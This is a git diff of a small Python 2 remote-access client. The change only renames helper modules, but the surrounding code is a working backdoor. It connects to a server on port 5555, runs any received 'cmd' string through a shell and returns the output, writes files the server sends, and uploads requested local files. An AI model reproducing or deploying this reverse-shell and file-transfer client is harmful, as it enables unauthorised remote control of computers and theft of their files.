@@ -2,8 +2,8 @@
 import os
 import socket
 import subprocess
-import socket_util as su
-import file_util as fu
+import network as net
+import files as files
 
 SERVER_IP = '127.0.0.1'
 PORT_NUM = 5555
@@ -30,7 +30,7 @@ class Client(object):
     def consoleWithServer(self):
         command = ''
         while True:
-            command = su.recvAll(self.sock)
+            command = net.recvAll(self.sock)
             print command
             
             if 'cmd' in command:
@@ -41,22 +41,22 @@ class Client(object):
                     continue
                 cmd = subprocess.Popen(command[3:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                su.sendAll(self.sock ,output_bytes)
+                net.sendAll(self.sock ,output_bytes)
                 continue
             
             splited_cmd = command.split(' ')
             
             if 'sendfile' in command:
-                data = su.recvAll(self.sock)
-                fu.createFileWithData(splited_cmd[2],data)
+                data = net.recvAll(self.sock)
+                files.createFileWithData(splited_cmd[2],data)
                 continue
 
             if 'getfile' in command:
-                data = fu.getFileData(splited_cmd[1])
+                data = files.getFileData(splited_cmd[1])
                 if data == None:
                     data = 'Error get file'
                     continue
-                su.sendAll(self.sock,data)
+                net.sendAll(self.sock,data)
 
 if __name__ == "__main__":
     Client( SERVER_IP, PORT_NUM).listen()
